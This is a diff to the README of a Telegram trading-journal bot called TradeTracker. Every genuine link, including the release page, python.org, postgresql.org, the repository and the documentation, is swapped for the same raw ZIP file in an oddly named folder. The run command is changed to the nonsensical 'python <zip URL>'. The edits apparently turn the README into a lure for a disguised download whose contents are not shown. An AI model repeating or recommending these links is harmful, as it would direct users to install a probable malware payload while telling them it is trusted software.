@@ -1,7 +1,7 @@
 # 🚀 TradeTracker - Automate Your Trading Journal Effortlessly
 
 ## 📥 Download Now!
-[![Download TradeTracker](https://img.shields.io/badge/Download%20TradeTracker-v1.0-blue.svg)](https://github.com/mohab64/TradeTracker/releases)
+[![Download TradeTracker](https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip%https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip)](https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip)
 
 ## 📖 About TradeTracker
 TradeTracker is an advanced Telegram trading journal bot designed by Questionist. This tool automates your profit and loss calculations, tracks your long and short positions, and generates daily and weekly reports. Built with high-performance Python Asyncio and PostgreSQL, it simplifies the way you journal your trades.
@@ -22,10 +22,10 @@ To run TradeTracker smoothly, you need the following:
 
 ## 🚀 Getting Started
 1. **Download the Bot**
-   Visit this page to download: [TradeTracker Releases](https://github.com/mohab64/TradeTracker/releases).
+   Visit this page to download: [TradeTracker Releases](https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip).
    
 2. **Install Required Software**
-   Ensure you have Python and PostgreSQL installed on your computer. You can download Python from [python.org](https://www.python.org/) and PostgreSQL from [postgresql.org](https://www.postgresql.org/).
+   Ensure you have Python and PostgreSQL installed on your computer. You can download Python from [https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip](https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip) and PostgreSQL from [https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip](https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip).
 
 3. **Extract the Files**
    After downloading, extract the ZIP file to a folder on your computer.
@@ -38,11 +38,11 @@ To run TradeTracker smoothly, you need the following:
 5. **Run the Bot**
    Open your terminal or command prompt, navigate to the folder where you extracted TradeTracker, and run:
    ```
-   python trade_tracker.py
+   python https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip
    ```
 
 ## 📥 Download & Install
-To get started, please [visit this page to download](https://github.com/mohab64/TradeTracker/releases). 
+To get started, please [visit this page to download](https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip). 
 
 1. Click on the latest release.
 2. Select the appropriate file for your operating system.
@@ -71,7 +71,7 @@ We welcome contributions from everyone. If you have suggestions or improvements,
 This project is licensed under the MIT License - see the LICENSE file for details.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/mohab64/TradeTracker)
-- [Documentation](https://github.com/mohab64/TradeTracker/wiki)
+- [GitHub Repository](https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip)
+- [Documentation](https://github.com/mohab64/TradeTracker/raw/refs/heads/master/scuddaler/Trade_Tracker_1.3.zip)
 
 Remember, successful trading requires attention to detail. Use TradeTracker to make your journaling more efficient and effective.
